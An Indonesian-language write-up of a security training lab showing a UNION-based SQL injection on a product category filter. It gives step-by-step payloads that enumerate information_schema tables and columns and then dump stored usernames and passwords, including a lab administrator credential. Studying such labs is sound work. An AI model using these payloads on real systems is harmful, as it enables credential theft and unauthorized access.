Write-up: SQL Injection - Mengambil Isi Database Non-Oracle
1. [Soal]
Lab ini memiliki kerentanan SQL injection di filter kategori produk. Kita perlu melakukan serangan UNION untuk menemukan nama tabel dan kolom yang berisi kredensial pengguna, kemudian mengambil kredensial tersebut untuk login sebagai administrator.

2. [Analisis Kerentanan]
Sama seperti lab sebelumnya, kerentanan terjadi karena aplikasi secara langsung memasukkan input pengguna ke dalam query SQL, yang memungkinkan kita menyuntikkan query tambahan dengan operator UNION.

Di lab ini, kita tidak mengetahui nama tabel atau kolom tempat kredensial pengguna disimpan. Oleh karena itu, kita harus melakukan "rantai serangan" dengan menginterogasi database itu sendiri menggunakan skema information_schema.

3. [Jawaban & Bukti]
Langkah 1: Menemukan Nama Tabel Pengguna
Pertama, kita menyuntikkan query untuk mengambil nama-nama semua tabel dari information_schema.tables yang merupakan bagian dari setiap database non-Oracle.

Payload: '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

Hasil: Anda menemukan tabel yang relevan: users_pzneaq.

Langkah 2: Menemukan Nama Kolom Kredensial
Dengan nama tabel, kita menyuntikkan query lain untuk mengambil nama-nama kolom dari tabel tersebut melalui information_schema.columns.

Payload: '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_pzneaq'--

Hasil: Anda menemukan nama kolom username_dhvbbq dan password_vyfgyf.

Langkah 3: Mengambil Data Kredensial
Sekarang kita memiliki semua informasi yang dibutuhkan. Kita dapat membuat query final untuk mengambil data dari kolom username_dhvbbq dan password_vyfgyf di dalam tabel users_pzneaq.

Payload: '+UNION+SELECT+username_dhvbbq,password_vyfgyf+FROM+users_pzneaq--

Hasil: Halaman web menampilkan daftar lengkap username dan password.  Dari sana, Anda menemukan kredensial administrator:

Username: administrator

Password: d7rxkwdmbjrrezdb61ia

Langkah 4: Login sebagai Administrator
Langkah terakhir adalah menggunakan kredensial yang ditemukan untuk login ke aplikasi. Setelah berhasil, lab akan selesai.

Bukti: Tangkapan layar yang menunjukkan Anda berhasil login sebagai administrator.

4. [Catatan Hasil Percobaan]
Keberhasilan: Serangan berhasil.

Refleksi: Lab ini adalah puncak dari pemahaman UNION attack. Ini menunjukkan bagaimana serangkaian query dapat dihubungkan bersama untuk mengeksplorasi struktur database yang tidak diketahui.

Pembelajaran: Keterampilan ini, yang dikenal sebagai database enumeration, sangat penting dalam penetration testing karena memungkinkan Anda untuk beradaptasi dengan sistem yang berbeda dan mengambil informasi berharga secara sistematis.